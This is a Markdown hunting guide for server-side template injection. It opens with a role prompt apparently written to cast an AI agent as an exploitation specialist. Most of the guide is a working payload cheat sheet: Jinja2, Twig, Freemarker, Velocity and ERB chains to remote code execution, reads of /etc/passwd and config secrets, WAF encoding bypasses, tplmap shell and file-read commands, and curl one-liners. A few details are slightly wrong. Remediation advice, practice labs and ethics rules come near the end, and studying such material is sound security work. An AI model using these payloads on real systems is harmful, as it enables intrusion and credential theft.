# Server-Side Template Injection (SSTI) - Complete Hunting Guide

## Expert Role Definition and Mission Statement

You are an elite Server-Side Template Injection specialist with deep expertise across all major template engines. Your mission is to identify, fingerprint, and exploit SSTI vulnerabilities that allow attackers to execute arbitrary code on server systems. You possess mastery over Jinja2, Twig, Freemarker, Velocity, ERB, Slim, Mako, and Thymeleaf template engines. You understand the subtle differences in syntax, security models, and bypass techniques for each engine. Your goal is to chain SSTI with other vulnerabilities to achieve maximum impact, from data exfiltration to full remote code execution. You approach every target with methodical precision, using both automated tools and manual testing to uncover hidden injection points that scanners miss.

## Core Concepts Deep Dive

### What is SSTI?

Server-Side Template Injection occurs when user-supplied data is embedded into a template before being rendered by the server. Unlike client-side template injection, SSTI is processed on the backend, giving attackers direct access to server-side resources, file systems, and operating system commands.

### Template Engine Taxonomy

| Engine | Language | Syntax | Security Model |
|--------|----------|--------|----------------|
| Jinja2 | Python | `{{ }}`, `{% %}` | SandboxedEnvironment (optional) |
| Twig | PHP | `{{ }}`, `{% %}` | SandboxExtension |
| Freemarker | Java | `${}`, `<#>` | NewBuiltinClassResolver |
| Velocity | Java | `$var`, `#set` | SecureUberspector |
| ERB | Ruby | `<%= %>`, `<% %>` | No default sandbox |
| Slim | Ruby | `= expr`, `- code` | No default sandbox |
| Mako | Python | `${}`, `<% %>` | No default sandbox |
| Thymeleaf | Java | `${}`, `*{}`, `#{}` | Limited sandbox |
| Smarty | PHP | `{$var}`, `{function}` | Security class |
| Pug/Jade | Node.js | `#{}`, `#{}` | No default sandbox |

### SSTI Impact Hierarchy

1. **Information Disclosure** - Server configuration, environment variables, source code
2. **File System Access** - Read/write files on the server
3. **Remote Code Execution** - Execute OS commands through template engine capabilities
4. **Lateral Movement** - Pivot to internal systems from the compromised server

### Why SSTI is Dangerous

- Often bypasses WAF rules (not recognized as code injection)
- Can escalate from information disclosure to full RCE
- Many developers are unaware of the risk
- Template engines have powerful built-in functions
- Sandboxes are often not enabled or poorly configured

## Pre-requisite Knowledge

- Understanding of HTTP request/response cycles
- Basic knowledge of programming languages (Python, PHP, Java, Ruby)
- Familiarity with web application architecture
- Understanding of template engine syntax and rendering
- Knowledge of encoding techniques (URL, HTML, Unicode)
- Familiarity with common web frameworks and their default template engines
- Understanding of server-side processing vs client-side rendering

## Step-by-Step Hunting Methodology

### Phase 1: Input Discovery and Mapping

```
1. Enumerate all input vectors:
   - Form fields (text, textarea, hidden fields)
   - URL parameters
   - HTTP headers (User-Agent, Referer, X-Forwarded-For)
   - Cookie values
   - File upload content
   - JSON/XML request bodies
   - API parameters

2. Identify output contexts:
   - HTML body
   - HTML attributes
   - JavaScript strings
   - CSS content
   - HTTP headers (custom headers)
   - Error messages
   - PDF/document generation
   - Email templates
```

### Phase 2: Template Engine Fingerprinting

**Mathematical Expression Test:**
```
Payload: {{7*7}}
Payload: ${7*7}
Payload: <%= 7*7 %>
Payload: #{7*7}

Expected responses:
- Jinja2/Thymeleaf: 49
- Twig: 49
- Freemarker: 49
- ERB: 49
- Velocity: No output (processes differently)
- Smarty: 49
```

**String Concatenation Test:**
```
Payload: {{'ab'+'cd'}}
Payload: ${'ab'+'cd'}
Payload: <%= "ab" + "cd" %>

This confirms string handling behavior.
```

**Error-Based Fingerprinting:**
```
Payload: {{invalid}}
Payload: ${invalid}

Jinja2: UndefinedError
Twig: Twig_Error_Syntax
Freemarker: FreeMarker template error
ERB: NoMethodError or SyntaxError
```

**Conditional Rendering Test:**
```
Payload: {{true and true}}
Payload: {{true or false}}
Payload: {% if true %}YES{% endif %}

Confirms template processing and control flow.
```

### Phase 3: Capability Assessment

**File Read Test (Jinja2):**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ open('/etc/passwd').read() }}
{{ config.items() }}
```

**File Read Test (Freemarker):**
```
${"freemarker.template.utility.Execute"?new()("")}

<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("cat /etc/passwd")}
```

**Command Execution Test:**
```
// Jinja2
{{ ''.__class__.__mro__[1].__subclasses__()|attr('__getitem__')(XXX).__init__.__globals__['os'].popen('id').read() }}

// Twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Freemarker
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.Execute")>
<#assign ec=owc?new()>${ec("id")}
```

### Phase 4: Exploitation Chain

```
1. Confirm injection point
2. Fingerprint template engine
3. Enumerate available classes/functions
4. Test for sandbox restrictions
5. Escalate to file read
6. Escalate to RCE
7. Establish persistent access (if applicable)
8. Document all findings with PoC
```

## Tool Arsenal with Exact Commands

### Manual Testing Tools

**Tplmap (Automatic SSTI Detection):**
```bash
# Basic scan
python tplmap.py -u "http://target.com/page?name=test"

# With cookies
python tplmap.py -u "http://target.com/page?name=test" --cookie "session=abc123"

# POST request
python tplmap.py -u "http://target.com/page" --data "name=test"

# Specific engine
python tplmap.py -u "http://target.com/page?name=test" -p jinja2

# OS Shell
python tplmap.py -u "http://target.com/page?name=test" --os-cmd "id"

# File read
python tplmap.py -u "http://target.com/page?name=test" --read-file "/etc/passwd"
```

**Burp Suite Payloads:**
```
# Intruder positions for SSTI detection
§{{7*7}}§
§${7*7}%
§<%= 7*7 %>%
§#{7*7}%
§[% 7*7 %]%
§{{7*'7'}}%
```

**Custom SSTI Fuzzing Script:**
```python
#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "{{7*'7'}}",
    "${7*'7'}", "<%= 7 * 7 %>", "{{config}}", "{{settings}}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
]

def test_ssti(url, param, method="GET"):
    results = []
    for payload in SSTI_PAYLOADS:
        if method == "GET":
            resp = requests.get(url, params={param: payload})
        else:
            resp = requests.post(url, data={param: payload})
        
        if "49" in resp.text or "config" in resp.text:
            results.append({"payload": payload, "status": "potential_ssti"})
    
    return results

if __name__ == "__main__":
    target = sys.argv[1]
    param = sys.argv[2]
    results = test_ssti(target, param)
    for r in results:
        print(f"[+] {r['payload']} - {r['status']}")
```

### SSTI to RCE Cheat Sheet

**Jinja2 RCE Chain:**
```python
# Method 1: Class hierarchy walking
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Find the index of os._wrap_close or similar
# Then use:
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read() }}

# Method 2: Using cycler (Jinja2 specific)
{{ cycler.__init__.__builtins__['os'].popen('id').read() }}

# Method 3: Using joiner
{{ joiner.__init__.__builtins__['os'].popen('id').read() }}
```

**Twig RCE Chain:**
```php
// Method 1: Using filter callback
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

// Method 2: Using sandbox escape (if sandbox disabled)
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
```

**Freemarker RCE Chain:**
```java
// Method 1: Using Execute built-in
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}

// Method 2: Using ObjectConstructor
<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.utility.Execute")>
<#assign ec=owc?new()>${ec("id")}

// Method 3: Using JRuby
<#assign x="freemarker.template.utility.JythonRuntime"?new()>
<@x>import os;print(os.popen('id').read())</@x>
```

**Velocity RCE Chain:**
```java
// Method 1: Using Runtime
#set($class = $class.forName("java.lang.Runtime"))
#set($runtime = $class.getRuntime())
#set($process = $runtime.exec("id"))
#set($input = $process.getInputStream())
// ... read input stream
```

## Real-World Case Studies

### Case Study 1: SSTI in Email Template System

**Scenario:** A SaaS platform allows users to customize email templates for their customers.

**Discovery:**
```
POST /api/email-template/test HTTP/1.1
Content-Type: application/json

{
    "template": "Hello {{name}}, welcome to our platform!",
    "test_email": "test@example.com"
}
```

**Exploitation:**
```python
# Step 1: Fingerprint
POST /api/email-template/test HTTP/1.1
Content-Type: application/json

{"template": "{{7*7}}", "test_email": "test@example.com"}

Response: "Hello 49, welcome to our platform!"
# Confirmed: Jinja2

# Step 2: Read configuration
POST /api/email-template/test HTTP/1.1
Content-Type: application/json

{"template": "{{config}}", "test_email": "test@example.com"}

Response: Contains SECRET_KEY, DATABASE_URL, AWS credentials

# Step 3: RCE
POST /api/email-template/test HTTP/1.1
Content-Type: application/json

{"template": "{{''.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__['os'].popen('cat /flag.txt').read()}}", "test_email": "test@example.com"}

Response: "Hello FLAG{ssti_to_rce_achieved}, welcome to our platform!"
```

### Case Study 2: SSTI in PDF Generator

**Scenario:** An e-commerce site generates PDF invoices with user-provided names.

**Discovery:**
```
POST /api/generate-invoice HTTP/1.1
Content-Type: application/json

{
    "customer_name": "Test User",
    "items": [...]
}
```

**Exploitation:**
```python
# The PDF generator uses Thymeleaf
# Input: customer_name parameter

# Step 1: Fingerprint
POST /api/generate-invoice HTTP/1.1
Content-Type: application/json

{"customer_name": "${7*7}", "items": [...]}

# PDF contains: "Hello 49"

# Step 2: File read
POST /api/generate-invoice HTTP/1.1
Content-Type: application/json

{"customer_name": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}", "items": [...]}

# Server logs show command execution attempt
```

### Case Study 3: Blind SSTI in Error Messages

**Scenario:** Application shows generic error messages but processes templates.

**Detection:**
```
# Time-based detection
GET /page?id={{7*7}} HTTP/1.1
# Response time: 100ms

GET /page?id={{7*'7'*7*'7'*7*'7'*7*'7'*7*'7'}} HTTP/1.1
# Response time: 5000ms (heavy computation)

# This indicates template processing
```

**Exploitation via Blind SSTI:**
```python
# Use time-based exfiltration
GET /page?id={{''.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__['os'].popen('sleep 5').read()}} HTTP/1.1
# Response time: 5000ms confirms command execution
```

## Advanced Techniques and Bypass

### Sandbox Escape Techniques

**Jinja2 Sandbox Bypass:**
```python
# If SandboxedEnvironment is used:
# Method 1: Using __class__ chain
{{ ''.__class__.__mro__[1].__subclasses__() }}

# Method 2: Using format string
{{ "{}".format.__class__.__base__.__subclasses__() }}

# Method 3: Using string formatting with __import__
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__import__']('os').popen('id').read() }}
```

**Twig Sandbox Bypass:**
```php
// Method 1: Using apply filter
{{"id"|filter("system")}}

// Method 2: Using defined function
{{_self.env.hasExtension('Twig_Extension_Sandbox') }}
```

### Encoding Bypass

**Unicode Bypass:**
```python
# Jinja2 with Unicode
{{ \u0027\u002e\u005f\u0063\u006c\u0061\u0073\u0073 }}
# Interpreted as: '._class

# HTML Entity Bypass
{{ &#39;.__class__ }}
# Interpreted as: '.__class__
```

**Case Variation Bypass:**
```python
# Freemarker case-insensitive
${CLASS}
${Class}
${class}
# All refer to the same variable if not defined
```

### Restricted Environment Techniques

**Python Restricted Execution:**
```python
# If Python exec is restricted:
# Method 1: Using subprocess
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['subprocess'].check_output(['id']) }}

# Method 2: Using os.system
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].system('id') }}

# Method 3: Using eval with __builtins__
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['eval']("__import__('os').system('id')") }}
```

## Detection and Indicators

### Log Indicators

```
# Apache/Nginx logs
[error] Template Syntax Error: Unexpected token
[error] UndefinedError: 'module' object has no attribute
[warning] Potential SSTI detected in parameter

# Application logs
Twig_Error_Syntax: Unexpected token "punctuation"
jinja2.exceptions.UndefinedError: 'module' object
freemarker.template.TemplateException: Invalid reference
```

### WAF Detection Patterns

```
# Common SSTI patterns blocked by WAF
\{\{.*\}\}
\$\{.*\}
<%=.*%>
#\{.*\}

# But often bypassed with:
%7B%7B7*7%7D%7D  (URL encoded)
&#123;&#123;7*7&#125;&#125;  (HTML encoded)
```

## Impact Assessment

| Impact Level | Description | Example |
|-------------|-------------|---------|
| Critical | Full RCE with server access | `{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}` |
| High | File read/write access | `{{open('/etc/passwd').read()}}` |
| Medium | Information disclosure | `{{config}}`, `{{settings}}` |
| Low | Template logic manipulation | Conditional rendering bypass |

## Common Pitfalls

1. **Ignoring blind SSTI** - Not all SSTI returns output in response
2. **Overlooking email/PDF templates** - Common injection points
3. **Assuming WAF protection** - Template syntax often bypasses WAFs
4. **Not testing all input vectors** - Headers, cookies, file content
5. **Ignoring framework-specific syntax** - Different engines have different payloads
6. **Forgetting encoding bypass** - URL/HTML/Unicode encoding
7. **Not chaining with other vulns** - SSTI + IDOR, SSTI + SSRF
8. **Assuming sandbox is active** - Many apps don't enable sandboxing
9. **Not testing error handling** - Error messages reveal engine type
10. **Forgetting about auto-escaping** - May prevent some payloads

## Integration with Other Hunting Areas

- **SSRF**: Use SSTI to read internal files and pivot
- **IDOR**: Chain SSTI with IDOR to access other users' data
- **Authentication Bypass**: SSTI can bypass authentication checks
- **Privilege Escalation**: Modify user roles via SSTI
- **Information Disclosure**: Read configuration files
- **RCE Chains**: SSTI as initial access vector
- **File Upload**: Combine with file upload for webshell
- **XSS**: SSTI can generate XSS payloads

## Reporting Template

```
## Vulnerability: Server-Side Template Injection (SSTI)

### Summary
[One sentence description of the vulnerability]

### Affected Endpoint
- URL: [full URL]
- Parameter: [injection point]
- Method: [GET/POST/etc]

### Template Engine Identified
- Engine: [Jinja2/Twig/Freemarker/etc]
- Version: [if known]

### Proof of Concept
[Step-by-step reproduction instructions]

### Impact
[Detailed impact analysis]

### Remediation
- Use template sandboxing
- Avoid embedding user input in templates
- Use content security policies
- Validate and sanitize all input

### References
- CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine
- OWASP: Server Side Template Injection
```

## Practice Labs

### DVWS (Damn Vulnerable Web Server)
- URL: https://github.com/pschlink/DVWS
- Focus: Basic SSTI detection and exploitation

### PayloadsAllTheThings - SSTI
- URL: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Contains payloads for all major template engines

### HackTheBox - Template Labs
- Various challenges involving SSTI in different contexts

### PortSwigger Web Security Academy
- Free labs on SSTI exploitation
- https://portswigger.net/web-security/server-side-template-injection

### TryHackMe SSTI Room
- Guided SSTI learning path
- https://tryhackme.com/room/ssti

## Ethical Guidelines

1. **Only test systems you have permission to test**
2. **Do not access or exfiltrate data you don't own**
3. **Report all findings to the system owner**
4. **Do not cause damage to systems**
5. **Use test accounts for testing when possible**
6. **Document all actions for audit purposes**
7. **Follow responsible disclosure practices**
8. **Do not share exploits publicly**
9. **Comply with all applicable laws and regulations**
10. **Leave systems in the state you found them**

## Quick Reference Cheat Sheet

### SSTI Detection Payloads
```
{{7*7}}          # Jinja2, Twig, Freemarker
${7*7}           # Freemarker, Thymeleaf
<%= 7*7 %>       # ERB
#{7*7}           # Ruby, Thymeleaf
[% 7*7 %]        # Smarty
```

### SSTI to RCE Payloads

**Jinja2:**
```
{{''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['os'].popen('id').read()}}
```

**Twig:**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**Freemarker:**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

**ERB:**
```
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id") { |io| io.read } %>
```

### Quick Commands
```bash
# Tplmap scan
python tplmap.py -u "http://target.com/page?param=test"

# Tplmap with OS shell
python tplmap.py -u "http://target.com/page?param=test" --os-cmd "id"

# Tplmap file read
python tplmap.py -u "http://target.com/page?param=test" --read-file "/etc/passwd"

# Manual Jinja2 RCE
curl "http://target.com/page?param={{''.__class__.__mro__[1].__subclasses__()[213].__init__.__globals__['os'].popen('id').read()}}"
```
